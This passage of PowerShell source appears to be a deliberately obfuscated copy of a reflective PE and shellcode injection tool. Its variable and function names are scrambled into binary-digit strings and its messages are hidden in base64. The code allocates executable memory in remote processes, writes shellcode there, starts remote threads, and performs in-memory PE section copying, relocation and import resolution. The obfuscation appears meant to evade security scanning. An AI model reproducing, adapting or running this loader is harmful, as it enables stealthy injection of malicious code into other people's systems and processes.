        ${01001010101000110} = _01000001001001111 ${01001010101000110} (${01010011101110011}.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr(${01001101010000011}, ${01001010101000110}, $false)
        ${01001010101000110} = _01000001001001111 ${01001010101000110} (${11000010010100101})
        _01000001010000001 -_00101001000101111 ${10010000100110110} -_00000110000010110 ${01001010101000110}
        ${01001010101000110} = _01000001001001111 ${01001010101000110} (${10010000100110110}.Length)
        ${10001111101001000} = $Win32Functions.VirtualAllocEx.Invoke(${_01000110101000100}, [IntPtr]::Zero, [UIntPtr][UInt64]${01010101100101101}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
        if (${10001111101001000} -eq [IntPtr]::Zero)
        {
          Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
        }
        ${10111100011001010} = $Win32Functions.WriteProcessMemory.Invoke(${_01000110101000100}, ${10001111101001000}, ${00010101011110100}, [UIntPtr][UInt64]${01010101100101101}, [Ref]${10001110110000010})
        if ((${10111100011001010} -eq $false) -or ([UInt64]${10001110110000010} -ne [UInt64]${01010101100101101}))
        {
          Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
        }
        ${00110000110000000} = _00011001110011000 -_01000010000110000 ${_01000110101000100} -_01001010010000001 ${10001111101001000} -Win32Functions $Win32Functions
        ${10101110001001011} = $Win32Functions.WaitForSingleObject.Invoke(${00110000110000000}, 20000)
        if (${10101110001001011} -ne 0)
        {
          Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
        }
        [IntPtr]${10111100100100010} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${11000010010100101})
        ${10101110001001011} = $Win32Functions.ReadProcessMemory.Invoke(${_01000110101000100}, ${01001101010000011}, ${10111100100100010}, [UIntPtr][UInt64]${11000010010100101}, [Ref]${10001110110000010})
        if (${10101110001001011} -eq $false)
        {
          Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFIAZQBhAGQAUAByAG8AYwBlAHMAcwBNAGUAbQBvAHIAeQAgAGYAYQBpAGwAZQBkAA==')))
        }
        [IntPtr]${01011000001011010} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${10111100100100010}, [Type][IntPtr])
        $Win32Functions.VirtualFreeEx.Invoke(${_01000110101000100}, ${01001101010000011}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        $Win32Functions.VirtualFreeEx.Invoke(${_01000110101000100}, ${10001111101001000}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
      }
      else
      {
        [IntPtr]${00110000110000000} = _00011001110011000 -_01000010000110000 ${_01000110101000100} -_01001010010000001 ${00111000010101110} -_01100101011001011 ${01100011010101111} -Win32Functions $Win32Functions
        ${10101110001001011} = $Win32Functions.WaitForSingleObject.Invoke(${00110000110000000}, 20000)
        if (${10101110001001011} -ne 0)
        {
          Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
        }
        [Int32]${01110111111110100} = 0
        ${10101110001001011} = $Win32Functions.GetExitCodeThread.Invoke(${00110000110000000}, [Ref]${01110111111110100})
        if ((${10101110001001011} -eq 0) -or (${01110111111110100} -eq 0))
        {
          Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEcAZQB0AEUAeABpAHQAQwBvAGQAZQBUAGgAcgBlAGEAZAAgAGYAYQBpAGwAZQBkAA==')))
        }
        [IntPtr]${01011000001011010} = [IntPtr]${01110111111110100}
      }
      $Win32Functions.VirtualFreeEx.Invoke(${_01000110101000100}, ${01100011010101111}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
      return ${01011000001011010}
    }
    Function _01000000111111101
    {
      Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        ${_01000110101000100},
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        ${_00011001110111011},
        [Parameter(Position=2, Mandatory=$true)]
        [IntPtr]
        ${_10011000110010010},
        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        ${_01111111100011100}
      )
      ${11000010010100101} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
      [IntPtr]${00011111101001101} = [IntPtr]::Zero   
        if (-not ${_01111111100011100})
        {
          ${_01100000000001000} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${_10011000110010010})
        ${00001000101110001} = [UIntPtr][UInt64]([UInt64]${_01100000000001000}.Length + 1)
        ${00011111101001101} = $Win32Functions.VirtualAllocEx.Invoke(${_01000110101000100}, [IntPtr]::Zero, ${00001000101110001}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if (${00011111101001101} -eq [IntPtr]::Zero)
        {
          Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
        }
        [UIntPtr]${10001110110000010} = [UIntPtr]::Zero
        ${10111100011001010} = $Win32Functions.WriteProcessMemory.Invoke(${_01000110101000100}, ${00011111101001101}, ${_10011000110010010}, ${00001000101110001}, [Ref]${10001110110000010})
        if (${10111100011001010} -eq $false)
        {
          Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABEAEwATAAgAHAAYQB0AGgAIAB0AG8AIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMAIABtAGUAbQBvAHIAeQA=')))
        }
        if (${00001000101110001} -ne ${10001110110000010})
        {
          Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGQAbgAnAHQAIAB3AHIAaQB0AGUAIAB0AGgAZQAgAGUAeABwAGUAYwB0AGUAZAAgAGEAbQBvAHUAbgB0ACAAbwBmACAAYgB5AHQAZQBzACAAdwBoAGUAbgAgAHcAcgBpAHQAaQBuAGcAIABhACAARABMAEwAIABwAGEAdABoACAAdABvACAAbABvAGEAZAAgAHQAbwAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
        }
        }
        else
        {
            ${00011111101001101} = ${_10011000110010010}
        }
      ${01101110000011100} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
      ${00000011110010011} = $Win32Functions.GetProcAddress.Invoke(${01101110000011100}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA==')))) 
      ${01100111001100000} = $Win32Functions.VirtualAllocEx.Invoke(${_01000110101000100}, [IntPtr]::Zero, [UInt64][UInt64]${11000010010100101}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
      if (${01100111001100000} -eq [IntPtr]::Zero)
      {
        Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIAB0AGgAZQAgAHIAZQB0AHUAcgBuACAAdgBhAGwAdQBlACAAbwBmACAARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA==')))
      }
      [Byte[]]${00010101101011100} = @()
      if (${_00001100001100000}.PE64Bit -eq $true)
      {
        ${10011111110010000} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
        ${00011100011111100} = @(0x48, 0xba)
        ${01011100100000000} = @(0x48, 0xb8)
        ${00011100000011101} = @(0xff, 0xd0, 0x48, 0xb9)
        ${10001110000101010} = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
      }
      else
      {
        ${10011111110010000} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
        ${00011100011111100} = @(0xb9)
        ${01011100100000000} = @(0x51, 0x50, 0xb8)
        ${00011100000011101} = @(0xff, 0xd0, 0xb9)
        ${10001110000101010} = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
      }
      ${01010101100101101} = ${10011111110010000}.Length + ${00011100011111100}.Length + ${01011100100000000}.Length + ${00011100000011101}.Length + ${10001110000101010}.Length + (${11000010010100101} * 4)
      ${01001010101000110} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${01010101100101101})
      ${00010101011110100} = ${01001010101000110}
      _01000001010000001 -_00101001000101111 ${10011111110010000} -_00000110000010110 ${01001010101000110}
      ${01001010101000110} = _01000001001001111 ${01001010101000110} (${10011111110010000}.Length)
      [System.Runtime.InteropServices.Marshal]::StructureToPtr(${_00011001110111011}, ${01001010101000110}, $false)
      ${01001010101000110} = _01000001001001111 ${01001010101000110} (${11000010010100101})
      _01000001010000001 -_00101001000101111 ${00011100011111100} -_00000110000010110 ${01001010101000110}
      ${01001010101000110} = _01000001001001111 ${01001010101000110} (${00011100011111100}.Length)
      [System.Runtime.InteropServices.Marshal]::StructureToPtr(${00011111101001101}, ${01001010101000110}, $false)
      ${01001010101000110} = _01000001001001111 ${01001010101000110} (${11000010010100101})
      _01000001010000001 -_00101001000101111 ${01011100100000000} -_00000110000010110 ${01001010101000110}
      ${01001010101000110} = _01000001001001111 ${01001010101000110} (${01011100100000000}.Length)
      [System.Runtime.InteropServices.Marshal]::StructureToPtr(${00000011110010011}, ${01001010101000110}, $false)
      ${01001010101000110} = _01000001001001111 ${01001010101000110} (${11000010010100101})
      _01000001010000001 -_00101001000101111 ${00011100000011101} -_00000110000010110 ${01001010101000110}
      ${01001010101000110} = _01000001001001111 ${01001010101000110} (${00011100000011101}.Length)
      [System.Runtime.InteropServices.Marshal]::StructureToPtr(${01100111001100000}, ${01001010101000110}, $false)
      ${01001010101000110} = _01000001001001111 ${01001010101000110} (${11000010010100101})
      _01000001010000001 -_00101001000101111 ${10001110000101010} -_00000110000010110 ${01001010101000110}
      ${01001010101000110} = _01000001001001111 ${01001010101000110} (${10001110000101010}.Length)
      ${10001111101001000} = $Win32Functions.VirtualAllocEx.Invoke(${_01000110101000100}, [IntPtr]::Zero, [UIntPtr][UInt64]${01010101100101101}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
      if (${10001111101001000} -eq [IntPtr]::Zero)
      {
        Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
      }
      [UIntPtr]${10001110110000010} = [UIntPtr]::Zero
      ${10111100011001010} = $Win32Functions.WriteProcessMemory.Invoke(${_01000110101000100}, ${10001111101001000}, ${00010101011110100}, [UIntPtr][UInt64]${01010101100101101}, [Ref]${10001110110000010})
      if ((${10111100011001010} -eq $false) -or ([UInt64]${10001110110000010} -ne [UInt64]${01010101100101101}))
      {
        Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
      }
      ${00110000110000000} = _00011001110011000 -_01000010000110000 ${_01000110101000100} -_01001010010000001 ${10001111101001000} -Win32Functions $Win32Functions
      ${10101110001001011} = $Win32Functions.WaitForSingleObject.Invoke(${00110000110000000}, 20000)
      if (${10101110001001011} -ne 0)
      {
        Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
      }
      [IntPtr]${10111100100100010} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${11000010010100101})
      ${10101110001001011} = $Win32Functions.ReadProcessMemory.Invoke(${_01000110101000100}, ${01100111001100000}, ${10111100100100010}, [UIntPtr][UInt64]${11000010010100101}, [Ref]${10001110110000010})
      if ((${10101110001001011} -eq $false) -or (${10001110110000010} -eq 0))
      {
        Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFIAZQBhAGQAUAByAG8AYwBlAHMAcwBNAGUAbQBvAHIAeQAgAGYAYQBpAGwAZQBkAA==')))
      }
      [IntPtr]${10001101101011100} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${10111100100100010}, [Type][IntPtr])
      $Win32Functions.VirtualFreeEx.Invoke(${_01000110101000100}, ${10001111101001000}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
      $Win32Functions.VirtualFreeEx.Invoke(${_01000110101000100}, ${01100111001100000}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        if (-not ${_01111111100011100})
        {
            $Win32Functions.VirtualFreeEx.Invoke(${_01000110101000100}, ${00011111101001101}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
      return ${10001101101011100}
    }
    Function _10001010010110001
    {
      Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        ${_00110111011010011},
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        ${_00001100001100000},
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
      )
      for( ${00111011010111001} = 0; ${00111011010111001} -lt ${_00001100001100000}.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; ${00111011010111001}++)
      {
        [IntPtr]${01100000000010011} = [IntPtr](_01000001001001111 ([Int64]${_00001100001100000}.SectionHeaderPtr) (${00111011010111001} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
        ${10001011100011010} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${01100000000010011}, [Type]$Win32Types.IMAGE_SECTION_HEADER)
        [IntPtr]${01110000001011101} = [IntPtr](_01000001001001111 ([Int64]${_00001100001100000}.PEHandle) ([Int64]${10001011100011010}.VirtualAddress))
        ${00100000000010111} = ${10001011100011010}.SizeOfRawData
        if (${10001011100011010}.PointerToRawData -eq 0)
        {
          ${00100000000010111} = 0
        }
        if (${00100000000010111} -gt ${10001011100011010}.VirtualSize)
        {
          ${00100000000010111} = ${10001011100011010}.VirtualSize
        }
        if (${00100000000010111} -gt 0)
        {
          _00011010101001110 -_01100101100000011 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAtAFMAZQBjAHQAaQBvAG4AcwA6ADoATQBhAHIAcwBoAGEAbABDAG8AcAB5AA=='))) -_00001100001100000 ${_00001100001100000} -_01001010010000001 ${01110000001011101} -_00101100101110110 ${00100000000010111} | Out-Null
          [System.Runtime.InteropServices.Marshal]::Copy(${_00110111011010011}, [Int32]${10001011100011010}.PointerToRawData, ${01110000001011101}, ${00100000000010111})
        }
        if (${10001011100011010}.SizeOfRawData -lt ${10001011100011010}.VirtualSize)
        {
          ${01000100011001110} = ${10001011100011010}.VirtualSize - ${00100000000010111}
          [IntPtr]${_01001010010000001} = [IntPtr](_01000001001001111 ([Int64]${01110000001011101}) ([Int64]${00100000000010111}))
          _00011010101001110 -_01100101100000011 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAtAFMAZQBjAHQAaQBvAG4AcwA6ADoATQBlAG0AcwBlAHQA'))) -_00001100001100000 ${_00001100001100000} -_01001010010000001 ${_01001010010000001} -_00101100101110110 ${01000100011001110} | Out-Null
          $Win32Functions.memset.Invoke(${_01001010010000001}, 0, [IntPtr]${01000100011001110}) | Out-Null
        }
      }
    }
    Function _01001100100011000
    {
      Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        ${_00001100001100000},
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        ${_01010111111011000},
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
      )
      [Int64]${10000110001101000} = 0
      ${01000011000000110} = $true 
      [UInt32]${00100001011000001} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
      if ((${_01010111111011000} -eq [Int64]${_00001100001100000}.EffectivePEHandle) `
        -or (${_00001100001100000}.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
      {
        return
      }
      elseif ((_10110101011010111 (${_01010111111011000}) (${_00001100001100000}.EffectivePEHandle)) -eq $true)
      {
        ${10000110001101000} = _00010111111000011 (${_01010111111011000}) (${_00001100001100000}.EffectivePEHandle)
        ${01000011000000110} = $false
      }
      elseif ((_10110101011010111 (${_00001100001100000}.EffectivePEHandle) (${_01010111111011000})) -eq $true)
      {
        ${10000110001101000} = _00010111111000011 (${_00001100001100000}.EffectivePEHandle) (${_01010111111011000})
      }
      [IntPtr]${10001010010011011} = [IntPtr](_01000001001001111 ([Int64]${_00001100001100000}.PEHandle) ([Int64]${_00001100001100000}.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
      while($true)
      {
        ${10101001101101101} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${10001010010011011}, [Type]$Win32Types.IMAGE_BASE_RELOCATION)
        if (${10101001101101101}.SizeOfBlock -eq 0)
        {
          break
        }
        [IntPtr]${10010111000000110} = [IntPtr](_01000001001001111 ([Int64]${_00001100001100000}.PEHandle) ([Int64]${10101001101101101}.VirtualAddress))
        ${10111101010010010} = (${10101001101101101}.SizeOfBlock - ${00100001011000001}) / 2
        for(${00111011010111001} = 0; ${00111011010111001} -lt ${10111101010010010}; ${00111011010111001}++)
        {
          ${10011000010001000} = [IntPtr](_01000001001001111 ([IntPtr]${10001010010011011}) ([Int64]${00100001011000001} + (2 * ${00111011010111001})))
          [UInt16]${00100111100101011} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${10011000010001000}, [Type][UInt16])
          [UInt16]${00010101110010001} = ${00100111100101011} -band 0x0FFF
          [UInt16]${01101100111100010} = ${00100111100101011} -band 0xF000
          for (${01100100000101010} = 0; ${01100100000101010} -lt 12; ${01100100000101010}++)
          {
            ${01101100111100010} = [Math]::Floor(${01101100111100010} / 2)
          }
          if ((${01101100111100010} -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
            -or (${01101100111100010} -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
          {			
            [IntPtr]${10001010100001110} = [IntPtr](_01000001001001111 ([Int64]${10010111000000110}) ([Int64]${00010101110010001}))
            [IntPtr]${11000010010100010} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${10001010100001110}, [Type][IntPtr])
            if (${01000011000000110} -eq $true)
            {
              [IntPtr]${11000010010100010} = [IntPtr](_01000001001001111 ([Int64]${11000010010100010}) (${10000110001101000}))
            }
            else
            {
              [IntPtr]${11000010010100010} = [IntPtr](_00010111111000011 ([Int64]${11000010010100010}) (${10000110001101000}))
            }				
            [System.Runtime.InteropServices.Marshal]::StructureToPtr(${11000010010100010}, ${10001010100001110}, $false) | Out-Null
          }
          elseif (${01101100111100010} -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
          {
            Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgAgAHIAZQBsAG8AYwBhAHQAaQBvAG4AIABmAG8AdQBuAGQALAAgAHIAZQBsAG8AYwBhAHQAaQBvAG4AIAB2AGEAbAB1AGUAOgAgACQAewAwADEAMQAwADEAMQAwADAAMQAxADEAMQAwADAAMAAxADAAfQAsACAAcgBlAGwAbwBjAGEAdABpAG8AbgBpAG4AZgBvADoAIAAkAHsAMAAwADEAMAAwADEAMQAxADEAMAAwADEAMAAxADAAMQAxAH0A')))
          }
        }
        ${10001010010011011} = [IntPtr](_01000001001001111 ([Int64]${10001010010011011}) ([Int64]${10101001101101101}.SizeOfBlock))
      }
    }
    Function _10011110000000101
    {
      Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        ${_00001100001100000},
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        [Parameter(Position = 4, Mandatory = $false)]
        [IntPtr]
        ${_01000110101000100}
      )
      ${01100001000010111} = $false
      if (${_00001100001100000}.PEHandle -ne ${_00001100001100000}.EffectivePEHandle)
      {
        ${01100001000010111} = $true
      }
      if (${_00001100001100000}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
      {
        [IntPtr]${00110001100000000} = _01000001001001111 ([Int64]${_00001100001100000}.PEHandle) ([Int64]${_00001100001100000}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
        while ($true)
        {
          ${00001011111010110} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${00110001100000000}, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
          if (${00001011111010110}.Characteristics -eq 0 `
            -and ${00001011111010110}.FirstThunk -eq 0 `
            -and ${00001011111010110}.ForwarderChain -eq 0 `
            -and ${00001011111010110}.Name -eq 0 `
            -and ${00001011111010110}.TimeDateStamp -eq 0)
          {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAgAGkAbQBwAG8AcgB0AGkAbgBnACAARABMAEwAIABpAG0AcABvAHIAdABzAA==')))
            break
          }
          ${01101011010100111} = [IntPtr]::Zero
          ${_10101111101000110} = (_01000001001001111 ([Int64]${_00001100001100000}.PEHandle) ([Int64]${00001011111010110}.Name))
          ${00010000000011101} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${_10101111101000110})
          if (${01100001000010111} -eq $true)
          {
            ${01101011010100111} = _10100011101100110 -_01000110101000100 ${_01000110101000100} -_10101111101000110 ${_10101111101000110}
          }
          else
          {
            ${01101011010100111} = $Win32Functions.LoadLibrary.Invoke(${00010000000011101})
          }
          if ((${01101011010100111} -eq $null) -or (${01101011010100111} -eq [IntPtr]::Zero))
          {
            throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAaQBtAHAAbwByAHQAaQBuAGcAIABEAEwATAAsACAARABMAEwATgBhAG0AZQA6ACAAJAB7ADAAMAAwADEAMAAwADAAMAAwADAAMAAwADEAMQAxADAAMQB9AA==')))
          }
          [IntPtr]${01001011110111000} = _01000001001001111 (${_00001100001100000}.PEHandle) (${00001011111010110}.FirstThunk)
          [IntPtr]${01001101111111000} = _01000001001001111 (${_00001100001100000}.PEHandle) (${00001011111010110}.Characteristics) 
          [IntPtr]${10101110110001001} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${01001101111111000}, [Type][IntPtr])
          while (${10101110110001001} -ne [IntPtr]::Zero)
          {
                    ${_01111111100011100} = $false
                    [IntPtr]${10001000100000011} = [IntPtr]::Zero
            [IntPtr]${01110011010101011} = [IntPtr]::Zero
            if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]${10101110110001001} -lt 0)
            {
              [IntPtr]${10001000100000011} = [IntPtr]${10101110110001001} -band 0xffff 
                        ${_01111111100011100} = $true
            }
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]${10101110110001001} -lt 0)
            {
              [IntPtr]${10001000100000011} = [Int64]${10101110110001001} -band 0xffff 
                        ${_01111111100011100} = $true
            }
            else
            {
              [IntPtr]${10101101001001110} = _01000001001001111 (${_00001100001100000}.PEHandle) (${10101110110001001})
              ${10101101001001110} = _01000001001001111 ${10101101001001110} ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
              ${00001110101100011} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${10101101001001110})
                        ${10001000100000011} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${00001110101100011})
            }
            if (${01100001000010111} -eq $true)
            {
              [IntPtr]${01110011010101011} = _01000000111111101 -_01000110101000100 ${_01000110101000100} -_00011001110111011 ${01101011010100111} -_10011000110010010 ${10001000100000011} -_01111111100011100 ${_01111111100011100}
            }
            else
            {
                [IntPtr]${01110011010101011} = $Win32Functions.GetProcAddressIntPtr.Invoke(${01101011010100111}, ${10001000100000011})
            }
            if (${01110011010101011} -eq $null -or ${01110011010101011} -eq [IntPtr]::Zero)
            {
                        if (${_01111111100011100})
                        {
                            Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHcAIABmAHUAbgBjAHQAaQBvAG4AIAByAGUAZgBlAHIAZQBuAGMAZQAgAGkAcwAgAG4AdQBsAGwALAAgAHQAaABpAHMAIABpAHMAIABhAGwAbQBvAHMAdAAgAGMAZQByAHQAYQBpAG4AbAB5ACAAYQAgAGIAdQBnACAAaQBuACAAdABoAGkAcwAgAHMAYwByAGkAcAB0AC4AIABGAHUAbgBjAHQAaQBvAG4AIABPAHIAZABpAG4AYQBsADoAIAAkAHsAMQAwADAAMAAxADAAMAAwADEAMAAwADAAMAAwADAAMQAxAH0ALgAgAEQAbABsADoAIAAkAHsAMAAwADAAMQAwADAAMAAwADAAMAAwADAAMQAxADEAMAAxAH0A')))
                        }
                        else
                        {
                Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHcAIABmAHUAbgBjAHQAaQBvAG4AIAByAGUAZgBlAHIAZQBuAGMAZQAgAGkAcwAgAG4AdQBsAGwALAAgAHQAaABpAHMAIABpAHMAIABhAGwAbQBvAHMAdAAgAGMAZQByAHQAYQBpAG4AbAB5ACAAYQAgAGIAdQBnACAAaQBuACAAdABoAGkAcwAgAHMAYwByAGkAcAB0AC4AIABGAHUAbgBjAHQAaQBvAG4AOgAgACQAewAwADAAMAAwADEAMQAxADAAMQAwADEAMQAwADAAMAAxADEAfQAuACAARABsAGwAOgAgACQAewAwADAAMAAxADAAMAAwADAAMAAwADAAMAAxADEAMQAwADEAfQA=')))
                        }
            }
            [System.Runtime.InteropServices.Marshal]::StructureToPtr(${01110011010101011}, ${01001011110111000}, $false)
            ${01001011110111000} = _01000001001001111 ([Int64]${01001011110111000}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
            [IntPtr]${01001101111111000} = _01000001001001111 ([Int64]${01001101111111000}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
            [IntPtr]${10101110110001001} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${01001101111111000}, [Type][IntPtr])
                    if ((-not ${_01111111100011100}) -and (${10001000100000011} -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${10001000100000011})
                        ${10001000100000011} = [IntPtr]::Zero
                    }
          }
          ${00110001100000000} = _01000001001001111 (${00110001100000000}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
        }
      }
    }
    Function _01011100101011101
    {
      Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt32]
        ${_01111001100100000}
      )
      ${10100111111110110} = 0x0
